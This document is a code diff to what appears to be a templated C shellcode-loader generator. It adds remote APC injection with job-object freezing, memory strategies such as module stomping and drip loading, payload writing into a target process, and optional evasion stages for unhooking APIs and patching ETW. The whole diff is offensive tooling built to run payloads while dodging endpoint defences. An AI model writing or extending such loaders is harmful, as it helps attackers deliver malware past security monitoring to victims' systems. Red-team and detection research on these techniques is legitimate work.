@@ -49,6 +49,27 @@ char debug_buffer[512];
 {% endif %}
 {% if execution_method == 'remoteapc' %}
 #define JobObjectFreezeInformation 18
+
+typedef struct _JOBOBJECT_WAKE_FILTER {
+    ULONG HighEdgeFilter;
+    ULONG LowEdgeFilter;
+} JOBOBJECT_WAKE_FILTER, * PJOBOBJECT_WAKE_FILTER;
+
+typedef struct _JOBOBJECT_FREEZE_INFORMATION {
+    union {
+        ULONG Flags;
+        struct {
+            ULONG FreezeOperation : 1;
+            ULONG FilterOperation : 1;
+            ULONG SwapOperation : 1;
+            ULONG Reserved : 29;
+        };
+    };
+    BOOLEAN Freeze;
+    BOOLEAN Swap;
+    UCHAR Reserved0[2];
+    JOBOBJECT_WAKE_FILTER WakeFilter;
+} JOBOBJECT_FREEZE_INFORMATION, * PJOBOBJECT_FREEZE_INFORMATION;
 {% endif %}
 
 // --- DYNAMICALLY INCLUDE PARTIALS ---
@@ -63,7 +84,24 @@ char debug_buffer[512];
     {% include 'partials/api_resolver.c.j2' %}
 {% endif %}
 {% include data_source_partial %}
-{% include allocation_partial %}
+// --- MEMORY STRATEGY SELECTION ---
+// Memory allocator go here
+{% if allocation_method == 'driploader' %}
+    {% include 'partials/alloc_driploader_reserve.c.j2' %}
+{% elif 'modulestomping' in allocation_method %}
+    {% include 'partials/alloc_modulestomping.c.j2' %}
+{% elif allocation_method == 'mappedsection' %}
+    {% include 'partials/alloc_mappedsection.c.j2' %}
+{% else %}
+    {% include 'partials/alloc_virtualalloc.c.j2' %}
+{% endif %}
+
+// Memory writers go here
+{% if allocation_method == 'driploader' or 'drip' in allocation_method %}
+    {% include 'partials/write_drip_loop.c.j2' %}
+{% else %}
+    {% include 'partials/write_standard.c.j2' %}
+{% endif %}
 {% include execution_partial %}
 {% if bytecode_transformation == 'base64_encoder' %}
     {% include 'partials/decode_base64.c.j2' %}
@@ -80,8 +118,9 @@ char debug_buffer[512];
 
 // --- Function Forward Declarations ---
 BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize);
-void* AllocateExecutableMemory(SIZE_T size);
-void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len);
+void* AllocateExecutableMemory(HANDLE hTargetProcess, SIZE_T size);
+void WritePayload(HANDLE hTargetProcess, void* pBaseAddress, const unsigned char* payload, SIZE_T payload_len);
+void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len, HANDLE hTargetProcess, HANDLE hTargetThread, HANDLE hJob);
 void ResolveAPIs();
 {% if string_obfuscation_needed %}
 void DeobfuscateString(unsigned char* data, size_t len);
@@ -104,11 +143,32 @@ void Run() {
 
     ResolveAPIs();
 
+    // --- STAGE 1: PREPARATION ---
+    {% if evasion_unhook %}
+        {% include 'partials/evasion_unhook.c.j2' ignore missing %}
+    {% endif %}
+    {% if evasion_etw %}
+        {% include 'partials/evasion_etw.c.j2' ignore missing %}
+    {% endif %}
+
     {% if guardrails_needed %}
     if (!RunGuardrails()) {
         DEBUG_PRINT("Run: Guardrails failed. Terminating.");
         return;
     }
+    {% endif %}
+    
+    // --- STAGE 2: CONTEXT ---
+    HANDLE hTargetProcess = (HANDLE)-1; // we're defaulting to Local
+    HANDLE hTargetThread = NULL;
+    HANDLE hJob = NULL;
+
+    {% if execution_method == 'remoteapc' %}
+        {% include 'partials/setup_remote_spawn.c.j2' %}
+        if (hTargetProcess == NULL) {
+            DEBUG_PRINT("Run: Failed to setup remote process context.");
+            return;
+        }
     {% endif %}
 
     if (!LoadData(&initial_data, &initial_len)) {
@@ -154,8 +214,11 @@ void Run() {
     {% endif %}
 
     // Execution
-    exec_memory_block = AllocateExecutableMemory(current_len);
-    ExecutePayload(exec_memory_block, current_data, current_len);
+    exec_memory_block = AllocateExecutableMemory(hTargetProcess, current_len);
+    if (exec_memory_block) {
+        WritePayload(hTargetProcess, exec_memory_block, current_data, current_len);
+    }
+    ExecutePayload(exec_memory_block, current_data, current_len, hTargetProcess, hTargetThread, hJob);
 
     // Cleanup goes here
     if (initial_data != NULL) {
